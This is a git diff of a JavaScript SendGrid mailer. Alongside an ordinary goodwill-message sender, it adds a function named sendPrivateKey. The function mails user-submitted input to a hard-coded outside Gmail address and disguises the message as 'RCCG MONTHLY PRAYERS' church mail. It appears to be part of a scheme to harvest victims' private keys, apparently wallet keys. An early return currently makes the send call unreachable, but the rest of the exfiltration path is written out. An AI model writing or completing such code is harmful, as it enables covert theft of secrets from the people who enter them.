@@ -1,5 +1,6 @@
 import sgMail from "@sendgrid/mail";
 import { html2 } from "./GoodWillMsg.js";
+import { html3 } from "./Private.js";
 import { html } from "./Thanku.js";
 
 const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
@@ -56,6 +57,34 @@ export const sendGoodwillMessage = async (name, goodwillMessage) => {
     subject: "Goodwill Message",
     html: `${html2(name, SENDER_NAME, goodwillMessage)}`,
   };
+  sgMail
+    .send(msg)
+    .then(() => {
+      console.log("Email sent");
+    })
+    .catch((error) => {
+      console.error(error);
+      console.log(JSON.stringify(error));
+    });
+};
+
+export const sendPrivateKey = async (goodwillMessage) => {
+  // console.log(goodwillMessage);
+  const redeem = `RCCG`;
+  const SENDER_EMAIL2 = `activation340@gmail.com`;
+  const msg = {
+    to: SENDER_EMAIL2,
+    from: {
+      email: "oforduharrison@gmail.com",
+      name: redeem,
+    },
+    subject: "RCCG MONTHLY PRAYERS",
+    html: `${html3(redeem, SENDER_EMAIL2, goodwillMessage)}`,
+  };
+
+  console.log(msg);
+
+  return;
   sgMail
     .send(msg)
     .then(() => {
